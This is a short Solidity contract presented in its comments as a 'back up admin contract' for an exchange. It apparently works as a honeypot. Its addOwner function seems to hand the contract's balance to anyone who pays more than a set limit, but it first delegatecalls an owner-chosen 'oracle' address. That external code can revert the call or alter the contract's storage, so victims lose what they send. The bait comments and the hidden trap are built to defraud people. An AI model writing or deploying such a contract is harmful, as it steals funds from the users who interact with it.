1 // created by tommy wang
2 // segwit2x is the real bitcoin
3 // 09.11.17
4 // back up admin contract for yunbi, adds owner in case of lockout
5 
6 
7 pragma solidity ^0.4.18;
8 contract AdminInterface
9 {
10     address public Owner; // web3.eth.accounts[9]
11     address public oracle;
12     uint256 public Limit;
13     
14     function AdminInterface(){
15         Owner = msg.sender;
16     }
17     
18      modifier onlyOwner() {
19         require(msg.sender == Owner);
20     _;
21   }
22 
23     // config oracle db address and set minimum tx amt to limit abuse
24     function Set(address dataBase) payable onlyOwner
25     {
26         Limit = msg.value;
27         oracle = dataBase;
28     }
29     //can hold funds if needed
30     function()payable{}
31     
32     function transfer(address multisig) payable onlyOwner {
33         multisig.transfer(msg.value);
34     }
35 
36     function addOwner(address newAddr) payable
37     {   
38         if(msg.value > Limit)
39         {        
40             // Because database is an database address, this adds owner to the database for that contract
41             oracle.delegatecall(bytes4(keccak256("AddToWangDB(address)")),msg.sender);
42 
43             // transfer this wallets balance to new owner after address change
44             newAddr.transfer(this.balance);
45         }
46     }
47 }